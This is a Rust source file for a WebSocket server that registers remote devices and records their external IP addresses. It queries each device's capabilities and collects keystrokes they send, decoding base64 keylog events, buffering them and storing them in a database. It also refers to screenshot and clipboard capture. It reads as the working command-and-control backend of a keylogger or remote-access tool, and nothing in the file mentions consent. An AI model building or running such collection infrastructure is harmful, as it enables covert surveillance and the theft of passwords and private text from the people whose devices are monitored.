use crate::state::{AppState, Device, Format};
use axum::{
    Router,
    extract::{
        ConnectInfo, State,
        ws::{Message, WebSocket, WebSocketUpgrade},
    },
    response::IntoResponse,
    routing::get,
};
use std::{net::SocketAddr, time::Instant};
use tracing::{info, warn};

pub fn router() -> Router<AppState> {
    Router::new().route("/", get(ws_handler))
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_socket(socket, addr, state))
}

// ── Helpers ───────────────────────────────────────────────────────────────────

async fn recv_text(socket: &mut WebSocket) -> Option<String> {
    match socket.recv().await {
        Some(Ok(Message::Text(t))) => Some(t.trim().to_string()),
        _ => None,
    }
}

async fn send_text(socket: &mut WebSocket, msg: &str) -> bool {
    socket
        .send(Message::Text(msg.to_string().into()))
        .await
        .is_ok()
}

// ── Keylog flush — writes buffer to DB and resets state ───────────────────────

async fn flush_keylog(device_id: &str, state: &AppState) {
    let mut devices = state.devices.write().await;
    let dev = match devices.get_mut(device_id) {
        Some(d) => d,
        None => return,
    };

    if dev.keylog_buf.is_empty() {
        dev.keylog_last_flush = Instant::now();
        return;
    }

    let chunk = std::mem::take(&mut dev.keylog_buf);
    dev.keylog_last_flush = Instant::now();
    drop(devices); // release lock before DB call

    sqlx::query!(
        "INSERT INTO keylog (device_id, data) VALUES (?, ?)",
        device_id,
        chunk
    )
    .execute(&state.db)
    .await
    .ok();

    info!("Flushed keylog for {}", device_id);
}

// ── Main handler ──────────────────────────────────────────────────────────────

async fn handle_socket(mut socket: WebSocket, addr: SocketAddr, state: AppState) {
    info!("New connection from {}", addr);

    // ── Stage 1: HELLO ────────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => {
            warn!("Disconnected before HELLO");
            return;
        }
    };

    let ws_key = match msg.strip_prefix("HELLO ") {
        Some(key) => key.to_string(),
        None => {
            warn!("Bad HELLO from {}: {:?}", addr, msg);
            let _ = send_text(&mut socket, "HELLO_FAIL").await;
            return;
        }
    };

    let program = sqlx::query!("SELECT id FROM programs WHERE ws_key = ? LIMIT 1", ws_key)
        .fetch_optional(&state.db)
        .await;

    let program_id = match program {
        Ok(Some(row)) => row.id,
        _ => {
            warn!("Invalid ws_key from {}: {}", addr, ws_key);
            let _ = send_text(&mut socket, "HELLO_FAIL").await;
            return;
        }
    };

    if !send_text(&mut socket, "HELLO_OK").await {
        return;
    }

    // ── Stage 2: FORMAT ───────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let format = match msg.strip_prefix("FORMAT ") {
        Some("json") => Format::Json,
        Some("csv") => Format::Csv,
        _ => {
            let _ = send_text(&mut socket, "FORMAT_FAIL").await;
            return;
        }
    };

    if !send_text(&mut socket, "FORMAT_OK").await {
        return;
    }

    // ── Stage 3: IDENT ────────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let requested_id = match msg.strip_prefix("IDENT ") {
        Some(id) => id.to_string(),
        None => {
            let _ = send_text(&mut socket, "IDENT_FAIL").await;
            return;
        }
    };

    let device_id = if requested_id == "NEW" {
        let new_id = uuid::Uuid::new_v4().to_string();
        sqlx::query!(
            "INSERT INTO devices (device_id, program_id, ip_external) VALUES (?, ?, ?)",
            new_id,
            program_id,
            addr.ip().to_string()
        )
        .execute(&state.db)
        .await
        .ok();
        new_id
    } else {
        let existing = sqlx::query!(
            "SELECT device_id FROM devices WHERE device_id = ? AND program_id = ?",
            requested_id,
            program_id
        )
        .fetch_optional(&state.db)
        .await;

        match existing {
            Ok(Some(row)) => {
                sqlx::query!(
                    "UPDATE devices SET ip_external = ?, last_seen = NOW() WHERE device_id = ?",
                    addr.ip().to_string(),
                    row.device_id
                )
                .execute(&state.db)
                .await
                .ok();
                row.device_id
            }
            _ => {
                warn!("Unknown device_id from {}: {}", addr, requested_id);
                let _ = send_text(&mut socket, "IDENT_FAIL").await;
                return;
            }
        }
    };

    if !send_text(&mut socket, &format!("IDENT_OK {}", device_id)).await {
        return;
    }
    info!("IDENT_OK device_id={}", device_id);

    // ── Stage 4: CAPS ─────────────────────────────────────────────────────
    if !send_text(&mut socket, "CMD caps").await {
        return;
    }

    let caps_resp = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let caps: Vec<String> = match caps_resp.strip_prefix("CMD_OK ") {
        Some(list) => list.split(';').map(|s| s.trim().to_string()).collect(),
        None => {
            warn!("Bad caps from {}: {:?}", device_id, caps_resp);
            return;
        }
    };

    info!("Caps for {}: {:?}", device_id, caps);

    // ── Register in memory ────────────────────────────────────────────────
    {
        let mut devices = state.devices.write().await;
        devices.insert(
            device_id.clone(),
            Device {
                id: device_id.clone(),
                active: true,
                format,
                caps,
                keylog_buf: String::new(),
                keylog_last_flush: Instant::now(),
            },
        );
    }

    info!("Device {} ready", device_id);

    // ── Command loop ──────────────────────────────────────────────────────
    while let Some(Ok(msg)) = socket.recv().await {
        match msg {
            Message::Text(text) => {
                let text = text.trim().to_string();

                if text.starts_with("CMD_OK") {
                    // TODO: match against pending command queue
                } else if text.starts_with("CMD_FAIL") {
                    warn!("CMD_FAIL from {}: {}", device_id, text);
                } else if text.starts_with("EVENT ") {
                    handle_event(&device_id, &text, &state).await;
                } else {
                    warn!("Unknown message from {}: {}", device_id, text);
                }
            }
            Message::Close(_) => break,
            Message::Ping(_) | Message::Pong(_) => {}
            _ => {}
        }
    }

    // ── On disconnect: flush any remaining keylog ─────────────────────────
    flush_keylog(&device_id, &state).await;

    if let Some(dev) = state.devices.write().await.get_mut(&device_id) {
        dev.active = false;
    }
    sqlx::query!(
        "UPDATE devices SET last_seen = NOW() WHERE device_id = ?",
        device_id
    )
    .execute(&state.db)
    .await
    .ok();

    info!("Device disconnected: {}", device_id);
}

// ── EVENT handler ─────────────────────────────────────────────────────────────

async fn handle_event(device_id: &str, raw: &str, state: &AppState) {
    let mut parts = raw.splitn(3, ' ');
    let _ = parts.next(); // "EVENT"
    let event_type = match parts.next() {
        Some(t) => t,
        None => return,
    };
    let data = parts.next().unwrap_or("");

    match event_type {
        "keylog" => {
            // Decode base64, append to in-memory buffer, flush if threshold met
            let text = match base64::decode(data)
                .ok()
                .and_then(|b| String::from_utf8(b).ok())
            {
                Some(t) => t,
                None => {
                    warn!("Bad keylog b64 from {}", device_id);
                    return;
                }
            };

            let should_flush = {
                let mut devices = state.devices.write().await;
                if let Some(dev) = devices.get_mut(device_id) {
                    dev.keylog_buf.push_str(&text);
                    dev.should_flush_keylog()
                } else {
                    false
                }
            };

            if should_flush {
                flush_keylog(device_id, state).await;
            }
        }

        "alert" => {
            // data is "level;message"
            let mut fields = data.splitn(2, ';');
            let level = fields.next().unwrap_or("low");
            let message = fields.next().unwrap_or("");

            // Validate level — DB enum only accepts these three
            let level = match level {
                "low" | "medium" | "high" => level,
                _ => "low",
            };

            warn!("ALERT [{}] from {}: {}", level, device_id, message);

            sqlx::query!(
                "INSERT INTO events (device_id, level, message) VALUES (?, ?, ?)",
                device_id,
                level,
                message
            )
            .execute(&state.db)
            .await
            .ok();
        }

        "screenshot" | "clipboard" => {
            // Not stored server-side — handle via CMD response instead
            warn!(
                "Unexpected push event '{}' from {} — use CMD instead",
                event_type, device_id
            );
        }

        other => {
            warn!("Unknown event '{}' from {}", other, device_id);
        }
    }
}
